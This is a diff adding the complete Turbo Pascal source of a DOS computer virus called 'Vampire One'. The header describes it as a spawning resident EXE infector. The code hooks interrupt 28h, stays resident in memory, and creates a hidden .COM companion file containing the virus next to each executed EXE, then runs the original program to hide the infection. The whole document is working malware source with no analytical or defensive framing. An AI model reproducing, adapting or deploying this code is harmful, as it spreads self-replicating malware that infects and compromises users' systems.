@@ -1,0 +1,186 @@
+
+{
+                              Vampire One
+
+  Vampire One is a 3488 bytes spawning resident EXE infector. Vampire One
+  hooks interrupt 28h and infects the owner of the environment segment.
+
+  Compile it with Turbo Pascal v 7.00 or else it won't work correctly.
+}
+
+{$M 1552, 0, 0}
+Program VampireOneVirus;
+
+Uses
+  Dos;
+
+Const
+  BufSize        = 3488;
+  HeaderID       = 'Vampire One';
+
+Type
+  Buffer         = Array[0..BufSize - 1] of Char;
+
+Var
+  ParamCount     : Byte;
+  EnvironmentOff : Word;
+  EnvironmentSeg : Word;
+  Error          : Word;
+  Handle         : Word;
+  IntOff         : Word;
+  IntSeg         : Word;
+  PSPSeg         : Word;
+  DOSIdleAddr    : Procedure;
+  DOSIdleID      : String[11];
+  Filename       : String[80];
+  Parameters     : String[128];
+  FileBuf        : Buffer;
+
+Procedure GetIntAddr(IntNo : Byte); Assembler;
+
+Asm
+  MOV   AH,35h
+  MOV   AL,IntNo
+  INT   21h
+  MOV   IntOff,BX
+  MOV   IntSeg,ES
+End;
+
+Procedure CreateNewFile(Filename : String; Attributes : Word); Assembler;
+
+Asm
+  PUSH  DS
+  MOV   AH,5Bh
+  MOV   CX,Attributes
+  LDS   DX,Filename
+  INC   DX
+  INT   21h
+  POP   DS
+  JNB   @Done
+  MOV   Error,AX
+  @Done:
+  MOV   Handle,AX
+End;
+
+Procedure OpenFile(Filename : String; Access : Byte); Assembler;
+
+Asm
+  PUSH  DS
+  MOV   AH,3Dh
+  MOV   AL,Access
+  LDS   DX,Filename
+  INC   DX
+  INT   21h
+  POP   DS
+  JNB   @Done
+  MOV   Error,AX
+  @Done:
+  MOV   Handle,AX
+End;
+
+Procedure CloseFile; Assembler;
+
+Asm
+  MOV   AH,3Eh
+  MOV   BX,Handle
+  INT   21h
+  JNB   @CloseError
+  MOV   Error,AX
+  @CloseError:
+End;
+
+Procedure ReadFile(Var FileBuf : Buffer; ReadNum : Word); Assembler;
+
+Asm
+  PUSH  DS
+  MOV   AH,3Fh
+  MOV   BX,Handle
+  MOV   CX,ReadNum
+  LDS   DX,FileBuf
+  INT   21h
+  POP   DS
+  JNB   @Done
+  MOV   Error,AX
+  @Done:
+End;
+
+Procedure WriteFile(FileBuf : Buffer; WriteNum : Word); Assembler;
+
+Asm
+  PUSH  DS
+  MOV   AH,40h
+  MOV   BX,Handle
+  MOV   CX,WriteNum
+  LDS   DX,FileBuf
+  INT   21h
+  POP   DS
+  JNB   @Done
+  MOV   Error,AX
+  @Done:
+End;
+
+Procedure GetSegments; Assembler;
+
+Asm
+  MOV   AH,51h
+  INT   21h
+  MOV   ES,BX
+  MOV   ES,ES:[2Ch]
+  MOV   EnvironmentSeg,ES
+  MOV   PSPSeg,BX
+End;
+
+Procedure WhoExecute;
+
+Begin
+  EnvironmentOff := 0;
+  Filename := '';
+  GetSegments;
+  Repeat
+    EnvironmentOff := EnvironmentOff + 1;
+  Until MemW[EnvironmentSeg : EnvironmentOff] = $00;
+  EnvironmentOff := EnvironmentOff + 4;
+  Repeat
+    Filename := Filename + Chr(Mem[EnvironmentSeg : EnvironmentOff]);
+    EnvironmentOff := EnvironmentOff + 1;
+  Until Mem[EnvironmentSeg : EnvironmentOff - 1] = $00;
+End;
+
+Procedure DOSIdleHandler; Interrupt;
+
+Begin
+  Error := $00;
+  WhoExecute;
+  If Filename[Length(Filename) - 1] = 'E' then Begin
+    CreateNewFile(Copy(Filename, 1, Length(Filename) - 4) + 'COM' + #0, $22);
+    If Error = $00 then Begin
+      WriteFile(FileBuf, BufSize);
+      CloseFile;
+    End;
+  End;
+  Inline($9C);
+  DOSIdleAddr;
+End;
+
+Begin
+  GetIntAddr($28);
+  For IntOff := IntOff + $8B to IntOff + $95 do DOSIdleID := DOSIdleID + Chr(Mem[IntSeg : IntOff]);
+  WhoExecute;
+  If DOSIdleID <> HeaderID then Begin
+    OpenFile(Filename, $00);
+    If Error = $00 then Begin
+      ReadFile(FileBuf, BufSize);
+      CloseFile;
+      If Error = $00 then Begin
+        GetIntVec($28, @DOSIdleAddr);
+        SetIntVec($28, @DOSIdleHandler);
+      End;
+    End;
+  End;
+  Filename := Copy(Filename, 1, Length(Filename) - 4) + 'EXE';
+  For ParamCount := 1 to Mem[PSPSeg : $0080] do Parameters := Parameters + Chr(Mem[PSPSeg : $0080 + ParamCount]);
+  SwapVectors;
+  Exec(Filename, Parameters);
+  SwapVectors;
+  If (DOSIdleID <> HeaderID) and (Error = $00) then Keep(0);
+End.
